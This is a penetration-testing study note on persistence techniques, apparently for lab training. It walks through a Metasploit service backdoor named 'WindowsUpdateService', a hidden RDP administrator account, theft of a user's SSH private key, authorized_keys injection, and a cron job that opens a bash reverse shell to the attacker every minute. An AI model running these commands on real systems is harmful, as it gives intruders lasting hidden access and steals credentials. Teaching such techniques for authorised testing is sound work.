
# Persistence â€” Maintaining Access on Compromised Systems  

---

## ğŸ§  What is Persistence?

**Persistence** is the set of techniques adversaries use to maintain long-term access to a compromised system â€” even after reboots, credential changes, or partial cleanup by defenders.

ğŸ§© **MITRE ATT&CK Definition:**  
> Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold â€” such as replacing or hijacking legitimate code or adding startup code.

In short: **initial access â‰  permanent access.**  
Persistence ensures the adversary can **return** to the system anytime, without needing to exploit it again.

---

### ğŸ§­ Knowledge Base â€” MITRE ATT&CK Framework

**MITRE ATT&CK** is a comprehensive, publicly available knowledge base of real-world adversary tactics and techniques.  
It categorizes techniques (like persistence, lateral movement, privilege escalation, etc.) used by threat actors.

ğŸ”— **Website:** [https://attack.mitre.org](https://attack.mitre.org)  

ğŸ§© **How to use it:**
- Search for specific techniques (e.g., *â€œT1053 â€“ Scheduled Task/Jobâ€* or *â€œT1050 â€“ New Serviceâ€*).  
- Learn the *real-world persistence methods* used by attackers.  
- Reference these when creating your own persistence mechanisms during a penetration test â€” *always within your Rules of Engagement (RoE).*  
- Map your findings to MITRE ATT&CK for professional pentest reporting.

---

# ğŸªŸ Windows Persistence

Persistence on Windows can be achieved through:
- Services
- Registry modifications
- Scheduled tasks
- RDP (Remote Desktop)
- Startup folders
- WMI event subscriptions

Below are two common persistence approaches youâ€™ll use in labs.

---

## âš™ï¸ Persistence via Windows Service

### ğŸ’¡ Concept
Windows services are long-running executables that start automatically with the system.  
If you can create or modify a service, you can make it execute your payload every time the target reboots.

---

### ğŸ§ª Lab Demo

1. **Initial Exploit:**  
   Exploit the vulnerable **Rejetto HFS file server** and gain a Meterpreter session.

2. **Search for the persistence module:**
   ```bash
   search persistence_service
   use exploit/windows/local/persistence_service


3. **Module details:**

   * Requires **administrator privileges**.
   * Uploads a payload and registers it as a **new Windows service** that automatically starts on boot.

4. **Set options:**

   ```bash
   show options
   set SESSION 1
   set LPORT 4445     # Choose an unused port
   set SERVICE_NAME "WindowsUpdateService"
   exploit
   ```

5. **Test the persistence:**

   * Kill the active session:

     ```bash
     sessions -k 1
     ```
   * Start a handler to catch the new connection:

     ```bash
     use multi/handler
     set PAYLOAD windows/meterpreter/reverse_tcp
     set LHOST <your_ip>
     set LPORT 4445
     exploit
     ```

   âœ… Youâ€™ll get your session back automatically â€” persistence success!

---

## ğŸ–¥ï¸ Persistence via RDP (Remote Desktop Protocol)

### ğŸ’¡ Concept

By creating a new user, enabling RDP, and adding firewall rules, an attacker can ensure GUI-based persistent access to the system.

---

### ğŸ§ª Lab Demo (using BadBlue exploit)

1. Exploit **BadBlue** service to gain a Meterpreter session:

   ```bash
   use exploit/windows/http/badblue_passthru
   exploit
   ```

2. **Migrate to a stable process (like explorer.exe):**

   ```bash
   ps
   pgrep explorer
   migrate <PID>
   ```

3. **Set up RDP persistence easily using Meterpreterâ€™s built-in command:**

   ```bash
   run getgui -e -u digs -p 'Password@123'
   ```

### What `getgui` does:

* Checks if RDP service is enabled; enables it if not.
* Adds a new user (`digs`) with the specified password.
* Adds that user to:

  * **Administrators**
  * **Remote Desktop Users**
* Creates a **firewall rule** to allow port 3389.

4. **Connect via RDP from Kali:**

   ```bash
   xfreerdp /u:digs /p:'Password@123' /v:<target_ip>
   ```

Now you have **persistent GUI access** to the compromised system.

---

# ğŸ§ Linux Persistence

Persistence on Linux can be achieved using:

* SSH key injection
* Cron jobs
* Systemd service creation
* Bash profile backdoors
* Modifying startup scripts

---

## ğŸ”‘ Persistence via SSH Keys

### ğŸ’¡ Concept

Linux systems often use **SSH** for secure remote administration.
By planting your public key in the `authorized_keys` file of a user, you can log in without a password â€” even if that password later changes.

---

### ğŸ§ª Lab Demo

1. **Already exploited system:**

   ```bash
   whoami
   ls -al
   cd ~/.ssh
   ls
   ```

   You find:

   * `authorized_keys`
   * `id_rsa` (private key)

2. **View and exfiltrate the private key:**

   ```bash
   cat id_rsa
   ```

3. **Copy this key to your attacker machine (Kali):**

   ```bash
   scp student@<target_ip>:~/.ssh/id_rsa .
   chmod 400 id_rsa
   ```

4. **Recreate a connection using SSH key:**

   ```bash
   ssh -i id_rsa student@<target_ip>
   ```

âœ… Even if the studentâ€™s password changes, this private key still grants access!

---

### ğŸ§© Alternate Method â€” Add Your Own Public Key

1. Generate key pair on Kali:

   ```bash
   ssh-keygen -t rsa
   ```
2. Copy your public key to the target:

   ```bash
   echo "<your_public_key>" >> ~/.ssh/authorized_keys
   ```
3. Login anytime without password:

   ```bash
   ssh -i ~/.ssh/id_rsa student@<target_ip>
   ```

---

## â° Persistence via Cron Jobs

### ğŸ’¡ Concept

Cron jobs are Linuxâ€™s version of Windows Task Scheduler â€” automated tasks that run at defined intervals.
Attackers can create a malicious cron job that periodically runs a reverse shell or re-establishes communication with the C2 server.

---

### ğŸ§ª Lab Demo

1. **On the target:**

   ```bash
   ls -al
   cat /etc/cron*
   ```

2. **Create a reverse shell cron job:**

   ```bash
   echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<kali_ip>/<port> 0>&1'" > cron
   ```

   *(This will connect back to your listener every minute.)*

3. **Load it into the userâ€™s crontab:**

   ```bash
   crontab -i cron
   crontab -l
   ```

4. **Start listener on Kali:**

   ```bash
   nc -nvlp <port>
   ```

5. **Remove the `wait` file (simulate reboot/disconnection).**
   Within a minute, youâ€™ll get a **new reverse shell** â€” persistence verified.

---

## ğŸ§© Anatomy of a Cron Job


```
* * * * * command_to_execute
â”‚ â”‚ â”‚ â”‚ â”‚
â”‚ â”‚ â”‚ â”‚ â””â”€â”€ Day of week (0 - 7)
â”‚ â”‚ â”‚ â””â”€â”€â”€â”€ Month (1 - 12)
â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€ Day of month (1 - 31)
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€ Hour (0 - 23)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0 - 59)
```
---

# ğŸ§° imp

| OS      | Technique         | Tool/Command                                |
| ------- | ----------------- | ------------------------------------------- |
| Windows | New Service       | `exploit/windows/local/persistence_service` |
| Windows | RDP User          | `run getgui -e -u <user> -p <pass>`         |
| Linux   | SSH Key Injection | `scp`, `ssh-keygen`, `authorized_keys`      |
| Linux   | Cron Job          | `crontab -i`                                |

---

